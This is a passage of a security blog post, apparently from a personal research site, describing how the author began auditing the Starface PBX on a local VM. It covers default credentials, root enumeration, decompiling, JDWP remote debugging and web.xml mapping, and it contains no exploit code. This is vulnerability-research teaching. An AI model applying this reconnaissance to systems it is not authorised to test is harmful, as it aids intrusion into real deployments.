@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Security Code Audit - For Fun and Fails | Frycos Security Diary</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="Security Code Audit - For Fun and Fails" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Recently, I asked the Twitter community if anyone would be interested in a blog post about “failed” security code audit attempts. A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post but sometimes it seems that everybody thinks that security code audits are kind of “rocket science”. Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also a professional doesn’t fail and it wouldn’t take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland." />
+<meta property="og:description" content="Recently, I asked the Twitter community if anyone would be interested in a blog post about “failed” security code audit attempts. A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post but sometimes it seems that everybody thinks that security code audits are kind of “rocket science”. Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also a professional doesn’t fail and it wouldn’t take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland." />
+<link rel="canonical" href="http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails.html" />
+<meta property="og:url" content="http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails.html" />
+<meta property="og:site_name" content="Frycos Security Diary" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-05-24T23:00:09+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Security Code Audit - For Fun and Fails" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-24T23:00:09+02:00","datePublished":"2022-05-24T23:00:09+02:00","description":"Recently, I asked the Twitter community if anyone would be interested in a blog post about “failed” security code audit attempts. A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post but sometimes it seems that everybody thinks that security code audits are kind of “rocket science”. Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also a professional doesn’t fail and it wouldn’t take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland.","headline":"Security Code Audit - For Fun and Fails","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails.html"},"url":"http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Frycos Security Diary" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Frycos Security Diary</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Security Code Audit - For Fun and Fails</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-05-24T23:00:09+02:00" itemprop="datePublished">May 24, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Recently, I asked the Twitter community if anyone would be interested in a blog post about “failed” security code audit attempts.
+A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post
+but sometimes it seems that everybody thinks that security code audits are kind of “rocket science”.
+Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also
+a professional doesn’t fail and it wouldn’t take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland.</p>
+
+<p>So I try to give you a feeling how hard and frustrating it can be to audit a previously unknown product (without forgetting about the fun part!). Since my latest Pre-Auth RCE achievement
+was a PBX product named <em>3CX</em> (see my <a href="https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88">blog post</a>),
+I randomly chose another PBX product: <strong>Starface Comfortphoning</strong>. One can find tons of instances exposing the web interface to the public internet. Simply
+have a look at <a href="https://censys.io/">Censys.io</a> for example.</p>
+
+<p>This blog post not only should give you some insight into my methods but also (my personal) common failures. Also keep in mind that <strong>I didn’t fully
+audit the product yet, not at all</strong>. I might have looked at 10% max. The code base is just huge and there are several services besides the web interface running on such an instance.
+Thus, maybe after reading this blog post the one or the other will take some of my notes and find a nice vulnerability: I’m definitely still missing a lot of stuff
+which is of course fine. Also this is <strong>private time</strong> and not related to any of my assessments at work or something similar. But let’s begin.</p>
+
+<h1 id="setup">Setup</h1>
+
+<p>First, I looked at the <a href="https://www.starface.com/">vendor’s homepage</a> and read a lot of stuff like knowledge bases, support tickets, wikis etc.
+If I’m lucky, a trial version can be downloaded without talking to some sales guy waiting for recalls. In the <a href="https://knowledge.starface.de/pages/viewpage.action?pageId=46564694">Starface Wiki</a> I got the opportunity to download a full version of the latest release.
+I chose <strong>STARFACE VM-Edition / Version 7.2.0.5</strong> because virtual machine images usually come with a complete preinstallation and I can also
+control most of the environment, especially networking/firewalling.</p>
+
+<p>They even provided a nice <a href="https://knowledge.starface.de/display/SWD/Erstkonfiguration+der+STARFACE">documentation</a> for the initial setup, i.e.
+how to configure your instance properly. After a short installation routine, we were greeted with login web interface.</p>
+
+<p><img src="/assets/images/auditfails/loginmask.png" alt="Login mask" /></p>
+
+<p>An initial administrator account was created through the installation routine as well: <em>Mr. Admin Istrator</em> with credentials <code class="language-plaintext highlighter-rouge">0001:adminadmin</code>.
+Also an SSH service was provided, so I could easily get a proper shell as <code class="language-plaintext highlighter-rouge">root</code> and changed the default password to <code class="language-plaintext highlighter-rouge">adminadmin</code> as well.</p>
+
+<h1 id="enumeration-within-ssh-session">Enumeration within SSH session</h1>
+
+<p>This was a pretty comfortable situation, having access as root user via SSH. All I needed for the first round of enumeration.
+I always start with the basics, i.e. enumeration of <em>processes</em> and <em>network connections</em>. Starting with process enumeration, I try to look
+at <em>unusual stuff</em>, pretty much everything standing out from common (in this case) Linux processes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost ~]# ps axuf
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+<span class="o">[</span>...]
+root        1176  0.0  0.3  92320  6160 ?        Ss   22:14   0:00 /usr/sbin/sshd <span class="nt">-D</span> <span class="nt">-oCiphers</span><span class="o">=</span>aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc <span class="nt">-oMACs</span><span class="o">=</span>hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 <span class="nt">-oGSSAPIKexAlgorithms</span><span class="o">=</span>gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- <span class="nt">-oKexAlgorithms</span><span class="o">=</span>curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 <span class="nt">-oHostKeyAlgorithms</span><span class="o">=</span>ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com <span class="nt">-oPubkeyAcceptedKeyTypes</span><span class="o">=</span>ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com <span class="nt">-oCASignatureAlgorithms</span><span class="o">=</span>ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa
+<span class="o">[</span>...]
+tomcat      1696  2.5 40.0 4757928 810260 ?      Sl   22:14   0:57 /usr/bin/java <span class="nt">-Djava</span>.util.logging.config.file<span class="o">=</span>/opt/tomcat/conf/logging.properties <span class="nt">-Djava</span>.util.logging.manager<span class="o">=</span>org.apache.juli.ClassLoaderLogManager <span class="nt">-Dderby</span>.stream.error.file<span class="o">=</span>/dev/null <span class="nt">-Xmx988M</span> <span class="nt">-XX</span>:MaxDirectMemorySize<span class="o">=</span>64M <span class="nt">-XX</span>:+HeapDumpOnOutOfMemoryError <span class="nt">-XX</span>:HeapDumpPath<span class="o">=</span>/home/starface/tomcat-jmv-dump.hprof <span class="nt">-Dderby</span>.storage.pageCacheSize<span class="o">=</span>200 <span class="nt">-XX</span>:+UseParallelGC <span class="nt">-Dorg</span>.apache.catalina.connector.CoyoteAdapter.ALLOW_BACKSLASH<span class="o">=</span><span class="nb">true</span> <span class="nt">-Dorg</span>.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH<span class="o">=</span><span class="nb">true</span> <span class="nt">-Dorg</span>.apache.tomcat.util.http.Parameters.MAX_COUNT<span class="o">=</span>10000 <span class="nt">-Djdk</span>.tls.ephemeralDHKeySize<span class="o">=</span>4096 <span class="nt">-Djava</span>.protocol.handler.pkgs<span class="o">=</span>org.apache.catalina.webresources <span class="nt">-Dorg</span>.apache.catalina.security.SecurityListener.UMASK<span class="o">=</span>0002 <span class="nt">-agentlib</span>:jdwp<span class="o">=</span><span class="nv">transport</span><span class="o">=</span>dt_socket,address<span class="o">=</span>8000,server<span class="o">=</span>y,suspend<span class="o">=</span>n <span class="nt">-Dignore</span>.endorsed.dirs<span class="o">=</span> <span class="nt">-classpath</span> /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar <span class="nt">-Dcatalina</span>.base<span class="o">=</span>/opt/tomcat <span class="nt">-Dcatalina</span>.home<span class="o">=</span>/opt/tomcat <span class="nt">-Djava</span>.io.tmpdir<span class="o">=</span>/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start
+root        1697  0.0  0.1  26244  3176 tty1     Ss+  22:14   0:00 /bin/bash /usr/sbin/adminshell.sh
+root        1722  0.4  9.5 3791908 193660 ?      Sl   22:14   0:10 java <span class="nt">-jar</span> /var/lib/watchdog/watchdog.jar
+<span class="o">[</span>...]
+daemon      2861  0.6 16.0 4026156 324672 ?      Sl   22:15   0:14 /usr/lib/jvm/java/bin/java <span class="nt">-Djdk</span>.tls.ephemeralDHKeySize<span class="o">=</span>4096 <span class="nt">-DopenfireHome</span><span class="o">=</span>/opt/openfire <span class="nt">-Dopenfire</span>.lib.dir<span class="o">=</span>/opt/openfire/lib <span class="nt">-classpath</span> /opt/openfire/lib/startup.jar <span class="nt">-jar</span> /opt/openfire/lib/startup.jar
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>So one could observe strange SSH daemon command line parameters, an <code class="language-plaintext highlighter-rouge">adminshell.sh</code> and of course all these <strong>Java processes</strong>.
+Being mainly interested in the code audit parts, let’s change the directory to the presumably correct web app deployment: <code class="language-plaintext highlighter-rouge">/opt/tomcat/webapps/localhost/starface/</code>. If you’re not familiar with something of the technology stack you’re looking at during enumeration (or code audit) phase(s), always try to Google the hell out of it. Reading documentation not only gives you expert knowledge on a technology but also could lead to some hints for (new) exploitation primitives later on.</p>
+
+<p>Since we’re dealing with a Java application, one could start to search for JSP</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost starface] find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s1">'*.jsp'</span> <span class="c"># not really successful in this case</span>
+</code></pre></div></div>
+
+<p>or XML files</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost starface] find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s1">'*.xml'</span>
+<span class="o">[</span>...]
+./WEB-INF/classes/struts.xml
+./WEB-INF/classes/struts2-admin-interconnect.xml
+./WEB-INF/classes/struts2-admin-moh.xml
+./WEB-INF/classes/struts2-admin-phone.xml
+./WEB-INF/classes/struts2-admin-security.xml
+./WEB-INF/classes/struts2-module-designer.xml
+./WEB-INF/classes/struts2-module-manager.xml
+<span class="o">[</span>...]
+./WEB-INF/xml/authfilter_config.xml
+<span class="o">[</span>...]
+./WEB-INF/struts-config.xml
+<span class="o">[</span>...]
+./WEB-INF/web.xml <span class="c"># this is what you want later</span>
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>Again, I like to mark all file locations which somehow stand out from the “noisy” stuff such as resource bundle files containing UI messages for different languages for example. I guess most of you are already familiar with the <code class="language-plaintext highlighter-rouge">WEB-INF/web.xml</code> file, the web descriptor file with all kind of interesting declarations like <em>URL paths, Java Servlets, Java Filters, security constraints</em> and much more. We will look at this later.</p>
+
+<p>Also do not forget to look at the running network services: which services are listening on which ports? Are those services accessible from “outside”, i.e.
+not listening only on loopback interfaces? Is there a firewall in place?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost starface]# netstat <span class="nt">-antp</span> | <span class="nb">grep </span>LISTEN
+tcp        0      0 0.0.0.0:8000            0.0.0.0:<span class="k">*</span>               LISTEN      1696/java           
+tcp        0      0 0.0.0.0:5060            0.0.0.0:<span class="k">*</span>               LISTEN      1621/asterisk       
+tcp        0      0 0.0.0.0:5061            0.0.0.0:<span class="k">*</span>               LISTEN      1621/asterisk       
+tcp        0      0 127.0.0.1:5038          0.0.0.0:<span class="k">*</span>               LISTEN      1621/asterisk       
+tcp        0      0 0.0.0.0:4559            0.0.0.0:<span class="k">*</span>               LISTEN      1258/hfaxd          
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      1176/sshd           
+tcp        0      0 127.0.0.1:5432          0.0.0.0:<span class="k">*</span>               LISTEN      1205/postmaster     
+tcp        0      0 127.0.0.1:25            0.0.0.0:<span class="k">*</span>               LISTEN      2063/master         
+tcp6       0      0 :::50080                :::<span class="k">*</span>                    LISTEN      1696/java           
+tcp6       0      0 :::50081                :::<span class="k">*</span>                    LISTEN      1696/java           
+tcp6       0      0 127.0.0.1:9090          :::<span class="k">*</span>                    LISTEN      2861/java           
+tcp6       0      0 127.0.0.1:9091          :::<span class="k">*</span>                    LISTEN      2861/java           
+tcp6       0      0 :::5222                 :::<span class="k">*</span>                    LISTEN      2861/java           
+tcp6       0      0 :::5223                 :::<span class="k">*</span>                    LISTEN      2861/java           
+tcp6       0      0 :::5229                 :::<span class="k">*</span>                    LISTEN      2861/java           
+tcp6       0      0 :::8080                 :::<span class="k">*</span>                    LISTEN      1696/java           
+tcp6       0      0 127.0.0.1:8977          :::<span class="k">*</span>                    LISTEN      1696/java           
+tcp6       0      0 :::5269                 :::<span class="k">*</span>                    LISTEN      2861/java           
+tcp6       0      0 :::8181                 :::<span class="k">*</span>                    LISTEN      1696/java           
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      1176/sshd           
+tcp6       0      0 :::3000                 :::<span class="k">*</span>                    LISTEN      1696/java           
+tcp6       0      0 ::1:5432                :::<span class="k">*</span>                    LISTEN      1205/postmaster     
+tcp6       0      0 ::1:25                  :::<span class="k">*</span>                    LISTEN      2063/master         
+tcp6       0      0 :::3002                 :::<span class="k">*</span>                    LISTEN      1696/java
+</code></pre></div></div>
+
+<p>It’s easy to write all this stuff in a few minutes for this blog post but believe me: I usually spend a large amount of time
+for these enumeration steps. And <strong>everything is written down in great detail</strong> into my notes, preferably markdown.</p>
+
+<p>Also, I like to search through log files such as <code class="language-plaintext highlighter-rouge">/opt/tomcat/logs/catalina.out</code>. This revealed a nice banner providing more valuable information such as the Java version.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>####### STARFACE version 7.1.1.7 started in 50558ms. #######
+  Current Java version is: 1.8.0_292
+  JVM: OpenJDK 64-Bit Server VM (25.292-b10, mixed mode)
+  Running on: 4x amd64 Processor(s)
+  RAM available for JVM: 878 MB
+  Free hard disk space: 23 GB
+  HardwareId: 206f990abfa7126be1b54bcd082f7879be3677fa
+####### ############################################ #######
+</code></pre></div></div>
+
+<p>Why is this important? Sometimes several Java versions are installed on the same system but you want to make sure which one is used for the process you’re looking at right now.</p>
+
+<h1 id="setup-code-audit-toolset">Setup Code Audit Toolset</h1>
+
+<p>Before we talk about some tools I use during (Java) security code audits, what do we need? Well yes, the code.
+With some proper <code class="language-plaintext highlighter-rouge">find</code> commands, one can easily search for all relevant files: usually <code class="language-plaintext highlighter-rouge">*.class</code> and <code class="language-plaintext highlighter-rouge">*.jar</code>. You might include of course <code class="language-plaintext highlighter-rouge">*.jsp</code> etc.
+if applicable. But since you did proper file system enumeration before, it is already known to you where the code is located.</p>
+
+<p>My approach usually goes like this: <code class="language-plaintext highlighter-rouge">find . -iname '*.jar' -exec cp {} ALL_JARS \;</code>, i.e. all class and JAR files are copied to new directories I create in advance.
+Then there is a beautiful little <a href="https://github.com/mogwailabs/jarjarbigs">Python script</a> by <em>Mogwai Labs</em>. This script recursively goes through the input directory and in the end creates one “huge” JAR file for you. It can process JAR and class files as well.</p>
+
+<p>Now we got one or more JAR files and as you might know, Java bytecode is reversible which is great from an auditors perspective.
+There are quite some Java decompilers out there, here are my current recommendations:</p>
+
+<ul>
+  <li><a href="https://java-decompiler.github.io/">JD-GUI</a></li>
+  <li><a href="https://www.benf.org/other/cfr/">CFR</a></li>
+  <li><a href="https://github.com/mstrobel/procyon">Procyon</a></li>
+</ul>
+
+<p>There are even tools which provide different decompilers in one application such as <a href="https://github.com/Konloch/bytecode-viewer">Bytecode Viewer</a> which is great for a “quick overview” but I usually stick to the toolset above. And one definitely should use <strong>different Java decompilers</strong> because each one of them comes with strengths and weaknesses. The most obvious weakness you might spot: one or more Java classes couldn’t be decompiled by one decompiler but the others could.
+One decompiler has problems with reversing <code class="language-plaintext highlighter-rouge">switch</code> statements, the other might not be capable of extracting nested anonymous classes etc. pp.</p>
+
+<p>Alright, now all is setup for decompiling the huge JAR(s) we built with <code class="language-plaintext highlighter-rouge">jarjarbigs</code>. I won’t list all command line parameters for each decompiler so simply read the CLI manual or documentation. Now you’re ready to open the source files with the editor of your choice <strong>but</strong> we want to <strong>debug all the things</strong> as well.</p>
+
+<p>So we fetch the <strong>Eclipse IDE</strong> from <a href="https://www.eclipse.org/downloads/packages/">here</a>. I usually prefer the <strong>Eclipse IDE for Enterprise Java and Web Developers</strong> edition but <strong>Eclipse IDE for Java Developers</strong> might be sufficient for most cases.
+The <strong>JD-GUI</strong> project also provides an <a href="https://github.com/java-decompiler/jd-eclipse/releases/download/v2.0.0/jd-eclipse-2.0.0.zip">Eclipse plugin</a>
+which can be easily installed using the Eclipse menu path <code class="language-plaintext highlighter-rouge">Help -&gt; Install new Software</code>. Also do not forget to set the <strong>file associations</strong> for <em>class without source</em> etc. to the new plugin. Otherwise, Java classes won’t be decompiled in the editor mode automatically.</p>
+
+<p>You can check your configuration by opening a random Java type (e.g. <code class="language-plaintext highlighter-rouge">de.vertico.starface.db.container.UpdateContainer</code>) and what you should see is this.</p>
+
+<p><img src="/assets/images/auditfails/samplejavaclass.png" alt="Sample Java Class" /></p>
+
+<p>During our SSH session enumeration we of course checked if there was some kind of debugging service running already which was not. So how to setup a debug interface? What we need is a <strong>JDWP</strong> (Java Debug Wire Protocol) interface our Eclipse instance could talk to. Reading some Tomcat documentation one quickly finds a way to do this. We created a new file at <code class="language-plaintext highlighter-rouge">/opt/tomcat/bin</code> with the following content:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">CATALINA_OPTS</span><span class="o">=</span><span class="s2">"</span><span class="nv">$CATALINA_OPTS</span><span class="s2"> -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n"</span>
+</code></pre></div></div>
+
+<p>After restarting the virtual machine we tried to connect to the IP address <code class="language-plaintext highlighter-rouge">192.168.2.103</code> on port <code class="language-plaintext highlighter-rouge">8000</code> and….got nothing. This should have worked because there was no NATing in place or so. The virtual network interface was in <em>bridge mode</em> so we should have been able to talk to it. Several solutions existed but I usually chose the laziest: <strong>SSH port forwarding</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 8000:127.0.0.1:8000 root@192.168.2.103 <span class="nt">-f</span> <span class="nt">-N</span>
+</code></pre></div></div>
+
+<p>Now everything should have been setup to live debug the Java code. A few steps were missing though:</p>
+
+<ol>
+  <li>Create a new empty Java project.</li>
+  <li>Add the JAR file(s) baked with <code class="language-plaintext highlighter-rouge">jarjarbigs</code> to your project as <strong>external JAR dependencies</strong>.</li>
+  <li>Create a remote debug configuration and run it.</li>
+</ol>
+
+<p>The two steps in 3. should give you something like this.</p>
+
+<p><img src="/assets/images/auditfails/debugconfiguration.png" alt="Create Debug Configuration" /></p>
+
+<p><img src="/assets/images/auditfails/debugrunning.png" alt="Start Debugging" /></p>
+
+<p>We almost had all we needed to start the audit:</p>
+
+<ul>
+  <li>Running virtual machine of the vendor.</li>
+  <li>SSH access to the virtual machine with root privileges.</li>
+  <li>Decompiled Java code.</li>
+  <li>A working debugging environment in Eclipse.</li>
+</ul>
+
+<h1 id="application-mapping">Application Mapping</h1>
+
+<p>Before looking at any code, I take some time to learn about the web interface first. Starting up <strong>BurpSuite</strong>, login, click every button, fill every field and take notes about everything you observe in the UI in combination with requests going through your MitM proxy of your choice.</p>
+
+<p>We take the same mindset as we explained above during the SSH session enumeration part: try to spot <strong>interesting</strong> things but also <strong>uninteresting</strong> ones. “Uninteresting” could be e.g. “loading of JavaScript files”.</p>
+
+<p><img src="/assets/images/auditfails/uninterestingrequest.png" alt="Uninteresting Request" /></p>
+
+<p>And “interesting” example could be a request processing interesting parameters.</p>
+
+<p><img src="/assets/images/auditfails/interestingrequest.png" alt="Interesting Request" /></p>
+
+<p>Take notes about absolutely everything, even though you might think that it’s only <em>of little interest at the moment</em>. Often I revisit my notes from top to down from time to time during my review process and then “rediscover” things, get new ideas for chains whatsoever. Here are some examples:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">http://192.168.2.103/start.jsp</code> -&gt; we expect JSP handlers (strange, we didn’t find any JSP files, remember?)</li>
+  <li><code class="language-plaintext highlighter-rouge">http://192.168.2.103/login</code> -&gt; POST request with parameters named <code class="language-plaintext highlighter-rouge">forward</code> and <code class="language-plaintext highlighter-rouge">secret (0002:f3abb3a69bee79[...])</code> -&gt; containing our user ID <code class="language-plaintext highlighter-rouge">0002</code> and some kind of hash</li>
+  <li><code class="language-plaintext highlighter-rouge">http://192.168.2.103/frontend/calllist/display.do</code> -&gt; <code class="language-plaintext highlighter-rouge">.do</code> or <code class="language-plaintext highlighter-rouge">.action</code> might be good indicators for <strong>Struts</strong> being used</li>
+</ul>
+
+<h1 id="webxml">web.xml</h1>
+
+<p>After collecting tons of requests, understanding a bit of business logic, use cases etc. of the targeted product, we tried to understand how requests are mapped to code. In Java applications the <code class="language-plaintext highlighter-rouge">web.xml</code> usually reveals a ton of information. Of course this also depends on the frameworks used etc. which could make the content of this file minimal.</p>
+
+<p>In our case, the <code class="language-plaintext highlighter-rouge">web.xml</code> contained <strong>6651</strong> lines of content…<strong>six thousand six hundred and fifty one</strong>. That’s a looooot. So how did I approach this in the first place? Take your time to at least scroll slowly through the whole file because not every web descriptor file uses the same attributes, declarations etc. Try to use the principle of <strong>Divide and Conquer</strong> to extract abstract categories easier to handle by your brain in the beginning. This <em>could</em> look like this but I guess is pretty subjective.</p>
+
+<p>First, I realized Starface had a large number of <em>Java Filters</em>.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;filter&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>i18nFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;filter-class&gt;</span>de.vertico.starface.filters.i18nFilter<span class="nt">&lt;/filter-class&gt;</span>
+	<span class="nt">&lt;/filter&gt;</span>
+	<span class="nt">&lt;filter&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>PhoneMenuAuthFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;filter-class&gt;</span>de.vertico.starface.filters.PhoneAuthFilter<span class="nt">&lt;/filter-class&gt;</span>
+		<span class="nt">&lt;init-param&gt;</span>
+			<span class="nt">&lt;param-name&gt;</span>scope<span class="nt">&lt;/param-name&gt;</span>
+			<span class="nt">&lt;param-value&gt;</span>PhoneMenu<span class="nt">&lt;/param-value&gt;</span>
+		<span class="nt">&lt;/init-param&gt;</span>
+		<span class="nt">&lt;init-param&gt;</span>
+			<span class="nt">&lt;param-name&gt;</span>default-port<span class="nt">&lt;/param-name&gt;</span>
+			<span class="nt">&lt;param-value&gt;</span>50080<span class="nt">&lt;/param-value&gt;</span>
+		<span class="nt">&lt;/init-param&gt;</span>
+		<span class="nt">&lt;init-param&gt;</span>
+			<span class="nt">&lt;param-name&gt;</span>secure-port<span class="nt">&lt;/param-name&gt;</span>
+			<span class="nt">&lt;param-value&gt;</span>50081<span class="nt">&lt;/param-value&gt;</span>
+		<span class="nt">&lt;/init-param&gt;</span>
+	<span class="nt">&lt;/filter&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>Next, there were several extra configuration files included/referenced.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;context-param&gt;</span>
+		<span class="nt">&lt;param-name&gt;</span>configfile<span class="nt">&lt;/param-name&gt;</span>
+		<span class="nt">&lt;param-value&gt;</span>/WEB-INF/starface-config.xml<span class="nt">&lt;/param-value&gt;</span>
+	<span class="nt">&lt;/context-param&gt;</span>
+	<span class="nt">&lt;context-param&gt;</span>
+		<span class="nt">&lt;param-name&gt;</span>authFilterConfig<span class="nt">&lt;/param-name&gt;</span>
+		<span class="nt">&lt;param-value&gt;</span>/WEB-INF/xml/authfilter_config.xml<span class="nt">&lt;/param-value&gt;</span>
+	<span class="nt">&lt;/context-param&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>Then I saw the first <code class="language-plaintext highlighter-rouge">&lt;url-pattern&gt;</code> matchers, here linking ?Struts? action URLs to Java Filters.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="c">&lt;!-- .action filter mappings --&gt;</span>
+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>ExceptionFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>*.action<span class="nt">&lt;/url-pattern&gt;</span>
+		<span class="nt">&lt;dispatcher&gt;</span>REQUEST<span class="nt">&lt;/dispatcher&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+	<span class="nt">&lt;filter-mapping&gt;</span>
+		<span class="nt">&lt;filter-name&gt;</span>PortFilter<span class="nt">&lt;/filter-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>*.action<span class="nt">&lt;/url-pattern&gt;</span>
+		<span class="nt">&lt;dispatcher&gt;</span>REQUEST<span class="nt">&lt;/dispatcher&gt;</span>
+	<span class="nt">&lt;/filter-mapping&gt;</span>
+[...]
+</code></pre></div></div>
+
+<p>You could also map Java Filters with Java Servlets.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="c">&lt;!-- REST filter mappings --&gt;</span>
